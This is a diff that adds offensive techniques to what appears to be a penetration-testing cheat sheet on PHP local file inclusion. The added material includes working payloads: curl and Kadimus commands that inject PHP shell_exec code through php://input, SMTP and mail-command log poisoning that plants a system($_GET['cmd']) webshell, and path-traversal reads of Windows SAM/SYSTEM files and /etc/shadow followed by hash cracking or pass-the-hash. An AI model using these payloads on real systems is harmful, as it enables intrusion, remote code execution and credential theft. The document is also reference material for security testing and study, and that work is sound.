@@ -27,6 +27,7 @@
 * [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
 * [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
 * [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
+* [LFI to RCE via credentials files](#lfi-o-rce-via-credentials-files)
 
 ## Tools
 
@@ -119,7 +120,12 @@ can be chained with a compression wrapper for large files.
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
-NOTE: Wrappers can be chained : `php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s`
+NOTE: Wrappers can be chained multiple times : `php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s`
+
+```powershell
+./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
+curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
+```
 
 ### Wrapper zip://
 
@@ -150,11 +156,16 @@ http://example.com/index.php?page=expect://ls
 
 ### Wrapper input://
 
-Specify your payload in the POST parameters
+Specify your payload in the POST parameters, this can be done with a simple `curl` command.
 
 ```powershell
-http://example.com/index.php?page=php://input
-POST DATA: <?php system('id'); ?>
+curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
+```
+
+Alternatively, Kadimus has a module to automate this attack.
+
+```powershell
+./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
 ```
 
 ### Wrapper phar://
@@ -268,6 +279,35 @@ http://example.com/index.php?page=/usr/local/apache/log/error_log
 http://example.com/index.php?page=/usr/local/apache2/log/error_log
 ```
 
+### RCE via Mail
+
+First send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.
+
+```powershell
+root@kali:~# telnet 10.10.10.10. 25
+Trying 10.10.10.10....
+Connected to 10.10.10.10..
+Escape character is '^]'.
+220 straylight ESMTP Postfix (Debian/GNU)
+helo ok
+250 straylight
+mail from: mail@example.com
+250 2.1.0 Ok
+rcpt to: root
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+subject: <?php echo system($_GET["cmd"]); ?>
+data2
+.
+```
+
+In some cases you can also send the email with the `mail` command line.
+
+```powershell
+mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
+```
+
 ## LFI to RCE via PHP sessions
 
 Check if the website use PHP Session (PHPSESSID)
@@ -295,6 +335,31 @@ Use the LFI to include the PHP session file
 ```powershell
 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
 ```
+
+## LFI to RCE via credentials files
+
+This method require high privileges inside the application in order to read the sensitive files.
+
+### Windows version
+
+First extract `sam` and `system` files.
+
+```powershell
+http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
+http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
+```
+
+Then extract hashes from these files `samdump2 SYSTEM SAM > hashes.txt`, and crack them with `hashcat/john` or replay them using the Pass The Hash technique.
+
+### Linux version
+
+First extract `/etc/shadow` files.
+
+```powershell
+http://example.com/index.php?page=../../../../../../etc/shadow
+```
+
+Then crack the hashes inside in order to login via SSH on the machine.
 
 ## References
 
